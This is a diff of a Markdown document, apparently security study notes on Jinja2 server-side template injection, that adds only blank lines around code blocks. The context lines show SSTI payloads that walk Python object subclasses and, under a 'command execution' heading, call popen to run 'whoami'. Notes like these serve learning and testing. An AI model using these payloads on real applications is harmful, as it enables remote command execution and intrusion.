@@ -97,7 +97,10 @@ def index():
 <br>
 
 ````
+
 {{"".__class__.__bases__[0].__subclasses__()}}
+
+
 ````
 
 <br>
@@ -173,6 +176,8 @@ print((mem-1)/2)
 <br>
 
 3.命令执行
+
+
 ````
 
 {{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
